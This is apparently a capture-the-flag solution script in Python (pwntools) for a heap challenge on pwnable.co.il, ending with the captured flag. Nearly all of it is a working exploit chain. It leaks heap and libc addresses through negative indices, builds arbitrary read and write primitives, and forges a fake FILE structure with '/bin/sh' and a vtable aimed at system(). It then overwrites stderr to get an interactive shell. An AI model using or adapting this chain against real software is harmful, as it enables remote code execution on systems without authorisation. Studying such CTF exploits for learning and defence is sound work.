from pwn import *

CXA_FINALIZE_OFFSET = 0x0000000000035dc0 #__cxa_finalize
SYSTEM_OFFSET = 0x000000000003f830 #system
CHUNK_SIZE = 0x10 #friend chunk size

def send_option(p:process, option: int):
    p.sendline(str(option))
    p.recvuntil("4. Exit", timeout=0.1)

def leak_friends(p: process):
    send_option(p, 2)  
    p.sendline("-8")    
    p.recvuntil("Popularity: ").decode()
    friends = int(p.recvuntil('\n', timeout=0.1).decode()) + 0x78
    print("friends: ", hex(friends))
    return friends

def leak_libc(p: process):
    send_option(p, 2)  
    p.sendline("-9")    
    p.recvuntil("Popularity: ").decode()
    libc = int(p.recvuntil('\n', timeout=0.1).decode()) -  CXA_FINALIZE_OFFSET
    print("libc: ", hex(libc))
    return libc

def edit_name(p: process, name):
    send_option(p, 3)     
    p.sendline(name)
    p.recvuntil("Exit")    

def leak_index(p: process, index: int):
    send_option(p, 2)  
    p.sendline(str(index))
    p.recvuntil("Name: ")
    name = int.from_bytes(p.recvuntil('\n'), 'little')
    p.recvuntil("Exit", timeout=3)
    return name

def arbitrary_read(p: process, addr: int):
    edit_name(p, addr.to_bytes(8, 'little'))
    return fix_addr(leak_index(p, -2))

def create_friend(p: process, index: int, name: str = "temp"):
    send_option(p, 1)  
    p.sendline(str(index))    
    p.sendline(str(len(name) + 1))    
    p.send(name)
    p.recvuntil("Done!")

def fix_addr(addr: int):
    if addr >> (addr.bit_length() - 4) == 0xA:  # Check if highest 4 bits are 0xA
        addr &= (1 << (addr.bit_length() - 4)) - 1   # Mask out the top 4 bits
    return addr & 0xffff_ffff_ffff_ffff

#example: chunk_leak(p, "aaaaaa", friends)
def chunk_leak(p: process, friends: int, data: str = "default"):
    create_friend(p, -1, data)
    return arbitrary_read(p, friends - CHUNK_SIZE)

def overwrite_index(p: process, index: int, data: str):
    before = leak_index(p, index)
    create_friend(p, index, data)
    after = leak_index(p, index)
    return (before, after)

def arbitrary_write(p: process, addr: int, friends: int, data: str = "data"):
    if addr > friends:
        print(f"write is only for addresses lower then {hex(friends)} and addr is {hex(addr)}")
        return
    elif addr % 16 != 0:
        print(f"address isnt divided by 16 ({addr % 16})")
        return
    index =  (addr - friends) // 0x10
    return overwrite_index(p, index, data)

def gen_vtable(p: process, addr: int, offset: int, friends: int):
    return chunk_leak(p, friends, b"a" * offset + p64(addr))

def gen_malicious_file(p: process, libc: int, friends: int, p_file: int):
    context.bytes = 8
    file = b"/bin/sh\x00"
    file += (0x88 - len(file)) * b"\x00"
    file += p64(chunk_leak(p, friends, "\x00" * 8))
    file += (0xd8 - len(file)) * b"\x00"
    file += p64(gen_vtable(p, libc + SYSTEM_OFFSET, 0x38, friends))
    return bytes(file)

def overwrite_stderr(p: process, friends: int, libc: int):
    stderr_offset =  friends - 0x40
    new_stderr = gen_malicious_file(p, libc, friends, stderr_offset)
    arbitrary_write(p, stderr_offset, friends, new_stderr)

def main():
    context.log_level = 'debug'

    ### run ###
    p = remote("pwnable.co.il", 9012)
    p.sendline("noam")
    p.recvuntil("noam").decode()
    
    ### leaks ###
    friends = leak_friends(p)
    libc = leak_libc(p)

    ### payload start ###
    overwrite_stderr(p, friends, libc)
    p.sendline("9")
    p.interactive()
    
if __name__ == "__main__":
    main()

#flag: PWNIL{file_structure_exploitation_is_so_coool}